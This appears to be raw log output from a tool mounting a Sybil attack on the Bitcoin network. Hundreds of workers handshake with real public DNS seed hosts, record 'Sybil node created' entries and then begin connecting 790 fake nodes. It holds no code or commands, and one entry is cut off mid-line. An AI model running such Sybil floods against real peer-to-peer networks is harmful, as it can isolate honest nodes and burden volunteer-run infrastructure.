# [+] Sybil node created by Worker 346: aaaa741840892fb5698bb7446314ad00...
# [+] Sybil node created by Worker 249: 6e9d5b2ce86699a16db0426ccfa39e2a...
# [+] Sybil node created by Worker 79: 897224738acc243300d6c128a01d19ef...
# [+] Sybil node created by Worker 382: 76b1a9b38a9c449b3721af02a33d63da...
# [+] Sybil node created by Worker 91: 6598dbd3690079cb0ad5bcfbdfc7987b...
# [+] Sybil node created by Worker 176: 09de242788b2dffede1638ca9e3f4427...
# [+] Sybil node created by Worker 48: d2fbed7783618605e969a3ec1f5b8843...
# [+] Sybil node created by Worker 442: 27b1710466e36ed751137730107f1766...
# [+] Sybil node created by Worker 370: 7a148db06db08427357440dcd8878b11...
# [+] Sybil node created by Worker 454: ca62dc7ab0aabb5f6640d9f4c6cb5397...
# [+] Sybil node created by Worker 8: 4cab63718fcaf4adb1b981125d5a34b6...
# [+] Sybil node created by Worker 212: 9bb0f5bd78b0ce30b87a8ad107235038...
# [+] Sybil node created by Worker 56: b680e9054abded74f5a22969735f2f12...
# [+] Sybil node created by Worker 224: 37f8459ac8bf75aedfbed5709fc0f898...
# [+] Sybil node created by Worker 12: 3a315ce9b65d6b87a71a395c70606cf3...
# [+] Sybil node created by Worker 20: 011cf05919110bdef4d11bfdeb02bed9...
# [+] Sybil node created by Worker 714: dbfb3fe34699df007ebcd37612c8ca94...
# [+] Sybil node created by Worker 309: d05dbdc33eb1508dcfc87a8dad7b7022...
# [+] Sybil node created by Worker 139: 95312ed4db4e35dd14a4db180e179039...
# [+] Sybil node created by Worker 6: b6ccbea2fd64b4f97c48c91ee478dfeb...
# [+] Sybil node created by Worker 357: 3a01a1417326571bf2f04131c7f91426...
# [+] Sybil node created by Worker 151: ea738289b4fdbb6f6098af6c15c889ba...
# [+] Sybil node created by Worker 66: 9890cea1abe668c268c85a9a1c53057e...
# [+] Sybil node created by Worker 55: 66c7bf40e9269790c620df9feba9b61e...
# [+] Sybil node created by Worker 369: a9a1dd6a34396aac082e35bac037054a...
# [+] Sybil node created by Worker 78: fa2b8304dcd29cb4e41aace3ef859c97...
# [+] Sybil node created by Worker 381: 1085f71e0a929f09be2219692890dd5e...
# [+] Sybil node created by Worker 90: eb9c2d0be1961811f6cebadffe1680e5...
# [+] Sybil node created by Worker 344: 4c7e2094e45fd056742cd101fc46c53f...
# [+] Sybil node created by Worker 284: 25a34fd66f5c80b6cbccf979b2a9fe59...
# [+] Sybil node created by Worker 126: 6e59c5cb65ac2f148d915c11de0c918a...
# [+] Sybil node created by Worker 59: 401cbfc3f8d806c9793dccb9846c92a0...
# [+] Sybil node created by Worker 235: a17d5d3d5a84bd472802886e7d6a2934...
# [+] Sybil node created by Worker 150: cba66b5eb88612bea25f3cff523f097f...
# [+] Sybil node created by Worker 65: cb72be1247c65411ee81bfdf8cd437fb...
# [+] Sybil node created by Worker 162: 3b349382a73d16a0b94e49677e91873f...
# [+] Sybil node created by Worker 417: 0ebd63f12b1d14657cfb53d4cf86e768...
# [+] Sybil node created by Worker 247: b0f74771b11d9524c7b50b98bf2a8f6a...
# [+] Sybil node created by Worker 174: 8bff2811636461d265c2a0d32ae5c249...
# [+] Sybil node created by Worker 259: bddfb0ee8ecd09705bc89f3fa5c20486...
# [+] Sybil node created by Worker 89: 943aa3f9b96d5f8402eb78d1d8f8355f...
# [+] Sybil node created by Worker 380: 73bdfb7537b9f36f4e2d35629522a6e6...
# [+] Sybil node created by Worker 41: f6a1b1536af8fc596c85589efa28ebc6...
# [+] Sybil node created by Worker 594: a51fb7306da11184100694484c4685b4...
# [+] Sybil node created by Worker 392: 724e00e7be909cccde9a038b58818543...
# [+] Sybil node created by Worker 283: 83304fcc263b503a28581e610d02c808...
# [+] Sybil node created by Worker 101: 22dfc8bc92b3ec8c0bb4b5b3d8d9aceb...
# [+] Sybil node created by Worker 113: 118a573b8214431af3c0d8c6078e9440...
# [+] Sybil node created by Worker 295: db3df03ef7f4ed6d8df5962f08ee8c56...
# [+] Sybil node created by Worker 210: 5d8ecfe722ca41c6e6ef2584ebe872d7...
# [+] Sybil node created by Worker 779: ac96de64873686a0300da82738bcdb89...
# [+] Sybil node created by Worker 149: 056a9831009e11aa2a8928c87218fddc...
# [+] Sybil node created by Worker 64: f109d5fa29721d3a277ddf660e1d0941...
# [+] Sybil node created by Worker 46: e6f95a42ef7edd30bf4c97c670016409...
# [+] Sybil node created by Worker 246: 48943fae836f209f5af326ab5dcfb4a3...
# [+] Sybil node created by Worker 88: c83659f4a9c0657ede78467785fe1a1e...
# [+] Sybil node created by Worker 379: ca1e1018e31b6673244e51c2451fba3c...
# [+] Sybil node created by Worker 581: 0ffde84ce59d6de9d7b020baae6027fd...
# [+] Sybil node created by Worker 391: 5dd105135e244844625c0a806dbef71f...
# [+] Sybil node created by Worker 124: 474ef6a54ef62993fc2d1bc3a29d96a9...
# [+] Sybil node created by Worker 148: 7162b08577aca8936bb31ff5a4474ac5...
# [+] Sybil node created by Worker 257: e706a56497cc035db8236c2944876cca...
# [+] Sybil node created by Worker 87: edfb6f758fb676e0129f9e4797697155...
# [+] Sybil node created by Worker 31: 9156c31c7220a52e2057b7d4d1ae7267...
# [+] Sybil node created by Worker 354: 9bb315d8a58ff754e45359d8e940ed1e...
# [+] Sybil node created by Worker 378: c4605eb3966d00b1f498cd7fa2ea2bc4...
# [+] Sybil node created by Worker 3: 54c6c8ef70b78abf67ab030faa0df0b5...
# [+] Sybil node created by Worker 402: 24e07af8356873e74e69ab6bbef17e37...
# [+] Sybil node created by Worker 111: 6544c2dcca93d80daa3b5c34f718c613...
# [+] Sybil node created by Worker 39: 6ee94da365e1b1c301062b9f0921fb8e...
# [+] Sybil node created by Worker 33: 8436e93f032f61d038584066b3c714a8...
# [+] Sybil node created by Worker 293: b329e8525621d7133ee35279fc85fe86...
# [+] Sybil node created by Worker 135: 9866290632eeceaa5935c3efa669c774...
# [+] Sybil node created by Worker 353: afef74c69996070508254f6b031e05b2...
# [+] Sybil node created by Worker 47: 0874f5dfbedec9b4b4a96495262968b1...
# [+] Sybil node created by Worker 74: 90a7188d3d8a12ec727c351574500b2e...
# [+] Sybil node created by Worker 661: d601dba352ba829b518e57460530a951...
# [+] Sybil node created by Worker 426: 815a0d67d807f013dd8d238ce7355320...
# [+] Sybil node created by Worker 51: 8d85317f25108c0883b4de71d5a5f238...
# [+] Sybil node created by Worker 123: 0c7106261e23324b46f61e38a4300e93...
# [+] Sybil node created by Worker 407: 649df9356c638249909c89b00fa0e60e...
# [+] Sybil node created by Worker 565: e5420da757049d492b24db85889985ab...
# [+] Sybil node created by Worker 432: c23f59946c279f24b6e91905d84ad6d2...
# [+] Sybil node created by Worker 724: 9ad1c1230a476601d4d04816c009d7cf...
# [+] Sybil node created by Worker 430: 261b44593d34b69b55d349daa9ada331...
# [+] Sybil node created by Worker 660: 1862d9a67b80581fb49c19aac072bcbc...
# [Worker 696] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 696] Version: 70016 | User-Agent: /Satoshi:26.1.0/ | Height: 930222
# [Worker 713] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 713] Version: 70016 | User-Agent: /Satoshi:26.1.0/ | Height: 930222
# [Worker 507] Received 'version' from seed.btc.petertodd.org (102 bytes)
# [Worker 507] Version: 70015 | User-Agent: /Satoshi:0.20.0/ | Height: 930222
# [Worker 270] Received 'version' from dnsseed.bitcoin.dashjr.org (102 bytes)
# [Worker 270] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 637] Received 'version' from seed.bitcoin.sipa.be (102 bytes)
# [Worker 637] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 710] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 710] Version: 70016 | User-Agent: /Satoshi:26.1.0/ | Height: 930222
# [Worker 734] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 734] Version: 70016 | User-Agent: /Satoshi:26.1.0/ | Height: 930222
# [Worker 692] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 692] Version: 70016 | User-Agent: /Satoshi:26.1.0/ | Height: 930222
# [Worker 243] Received 'version' from seed.bitcoinstats.com (102 bytes)
# [Worker 243] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 655] Received 'version' from seed.bitcoin.jonasschnelli.ch (125 bytes)
# [Worker 655] Version: 70016 | User-Agent: /Satoshi:25.1.0(FutureBit-Apollo-Node)/ | Height: 930222
# [Worker 440] Received 'version' from dnsseed.bluematt.me (117 bytes)
# [Worker 440] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930222
# [Worker 698] Received 'version' from dnsseed.bitcoin.dashjr.org (102 bytes)
# [Worker 698] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 690] Received 'version' from seed.bitcoin.sipa.be (102 bytes)
# [Worker 690] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 425] Received 'version' from dnsseed.bluematt.me (117 bytes)
# [Worker 425] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930222
# [Worker 701] Received 'version' from dnsseed.bitcoin.dashjr.org (102 bytes)
# [Worker 701] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 452] Received 'version' from dnsseed.bitcoin.dashjr.org (102 bytes)
# [Worker 452] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 450] Received 'version' from seed.btc.petertodd.org (102 bytes)
# [Worker 450] Version: 70015 | User-Agent: /Satoshi:0.20.0/ | Height: 930222
# [Worker 462] Received 'version' from seed.btc.petertodd.org (102 bytes)
# [Worker 462] Version: 70015 | User-Agent: /Satoshi:0.20.0/ | Height: 930222
# [Worker 523] Received 'version' from seed.btc.petertodd.org (102 bytes)
# [Worker 523] Version: 70015 | User-Agent: /Satoshi:0.20.0/ | Height: 930222
# [Worker 501] Received 'version' from seed.btc.petertodd.org (102 bytes)
# [Worker 501] Version: 70015 | User-Agent: /Satoshi:0.20.0/ | Height: 930222
# [Worker 520] Connection closed: Socket closed prematurely while reading header
# [Worker 656] Received 'version' from dnsseed.bitcoin.dashjr.org (102 bytes)
# [Worker 656] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 182] Received 'version' from dnsseed.bitcoin.dashjr.org (102 bytes)
# [Worker 182] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 789] Received 'version' from seed.bitcoinstats.com (102 bytes)
# [Worker 789] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 498] Received 'version' from seed.btc.petertodd.org (102 bytes)
# [Worker 498] Version: 70015 | User-Agent: /Satoshi:0.20.0/ | Height: 930222
# [Worker 240] Received 'version' from seed.bitcoinstats.com (102 bytes)
# [Worker 240] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 517] Received 'version' from seed.bitcoinstats.com (102 bytes)
# [Worker 517] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 733] Received 'version' from seed.bitcoin.sipa.be (102 bytes)
# [Worker 733] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 633] Received 'version' from seed.bitcoinstats.com (117 bytes)
# [Worker 633] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930222
# [Worker 193] Received 'version' from dnsseed.bitcoin.dashjr.org (102 bytes)
# [Worker 193] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 684] Received 'version' from seed.bitcoin.sipa.be (102 bytes)
# [Worker 684] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 774] Received 'version' from seed.bitcoinstats.com (102 bytes)
# [Worker 774] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 526] Connection closed: Socket closed prematurely while reading header
# [Worker 338] Received 'version' from seed.bitcoinstats.com (102 bytes)
# [Worker 338] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# ...
# [Worker 157] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 157] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930222
# [+] Sybil node created by Worker 157: d1d723b84f7a81376745da7eb25f6ec9...
# [Worker 882] Error: [Errno 113] No route to host
# [Worker 269] Error: [Errno 113] No route to host
# [Worker 983] Error: [Errno 113] No route to host
# [Worker 540] Error: [Errno 113] No route to host
# [Worker 332] Error: [Errno 113] No route to host
# [Worker 659] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 659] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930222
# [+] Sybil node created by Worker 659: bea56f66b57b132a6fa85e21d9febb5d...
# [Worker 803] Received 'version' from seed.bitcoinstats.com (117 bytes)
# [Worker 803] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930222
# [+] Sybil node created by Worker 803: b3d5e1d2905db1e12624f742658961b5...
# [Worker 934] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 934] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930222
# [+] Sybil node created by Worker 934: 0a15c577099d14993174b85c5b078654...
# [Worker 465] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 465] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930222
# [+] Sybil node created by Worker 465: e037697a51a5c44a3a8f7a06095f55d2...
# [Worker 831] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 831] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930222
# [+] Sybil node created by Worker
Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930222
# [+] Sybil node created by Worker 999: 36dedfb4793f6b103a20369e45ae2928...
# [Worker 491] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 491] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930222
# [+] Sybil node created by Worker 491: fb065b9b6237cde7f00ea80d3fc7d82a...
# [Worker 509] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 509] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930222
# [+] Sybil node created by Worker 509: b3dcd99450a9707a8b6e5647de8d729b...
# [Worker 112] Error: [Errno 113] No route to host
# [Worker 528] Error: [Errno 113] No route to host
# [Worker 827] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 827] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930222
# [+] Sybil node created by Worker 827: 9fa712ffa7a580d0909588f9a5143552...
# [Worker 463] Error: [Errno 113] No route to host
# [Worker 118] Timeout connecting to dnsseed.bluematt.me[Worker 290] Timeout connecting to dnsseed.bluematt.me
#
# [Worker 306] Timeout connecting to dnsseed.bluematt.me
# [Worker 316] Timeout connecting to dnsseed.bluematt.me
# [Worker 308] Timeout connecting to dnsseed.bluematt.me
# [Worker 329] Timeout connecting to dnsseed.bluematt.me
# [Worker 320] Timeout connecting to dnsseed.bluematt.me
# [Worker 128] Timeout connecting to dnsseed.bluematt.me
# [Worker 9] Timeout connecting to dnsseed.bluematt.me
# [Worker 60] Timeout connecting to dnsseed.bluematt.me
# [Worker 476] Timeout connecting to dnsseed.bluematt.me
# [Worker 127] Timeout connecting to dnsseed.bluematt.me
# [Worker 471] Timeout connecting to dnsseed.bluematt.me
# [Worker 474] Timeout connecting to dnsseed.bluematt.me
# [Worker 479] Timeout connecting to dnsseed.bluematt.me
# [Worker 480] Timeout connecting to dnsseed.bluematt.me
# [Worker 493] Timeout connecting to dnsseed.bluematt.me
# [Worker 504] Timeout connecting to dnsseed.bluematt.me
# [Worker 505] Timeout connecting to dnsseed.bluematt.me
# [Worker 42] Timeout connecting to dnsseed.bluematt.me
# [Worker 279] Timeout connecting to dnsseed.bluematt.me
# [Worker 567] Timeout connecting to dnsseed.bluematt.me
# [Worker 578] Timeout connecting to dnsseed.bluematt.me
# [Worker 573] Timeout connecting to dnsseed.bluematt.me
# [Worker 576] Timeout connecting to dnsseed.bluematt.me
# [Worker 580] Timeout connecting to dnsseed.bluematt.me
# [Worker 582] Timeout connecting to dnsseed.bluematt.me
# [Worker 585] Timeout connecting to dnsseed.bluematt.me
# [Worker 248] Timeout connecting to seed.bitcoinstats.com[Worker 869] Timeout connecting to seed.bitcoinstats.com
#
# [Worker 868] Timeout connecting to seed.bitcoinstats.com
# [Worker 870] Timeout connecting to seed.bitcoinstats.com
# [Worker 84] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 377] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 299] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 629] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 62] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 605] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 566] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 358] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 931] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 936] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 935] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 942] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 945] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 953] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 631] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 955] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 962] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 961] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 282] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 446] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 612] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 228] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 534] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 330] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 623] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 167] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 879] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 854] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 834] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 541] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 345] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 253] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 250] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 570] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 843] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 653] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 588] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 431] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 355] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 137] Timeout connecting to dnsseed.bitcoin.dashjr.org
# [Worker 445] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 845] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 544] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# [Worker 597] Timeout connecting to seed.bitcoin.jonasschnelli.ch
# ------------------------------------------------------------
#
# [*] Connecting 790 Sybil nodes to the network...
#
# [Node 195] Received 'version' from seed.bitcoinstats.com (102 bytes)
# [Node 195] Version: 70016 | User-Agent: /Satoshi:29.2.0/ | Height: 930222
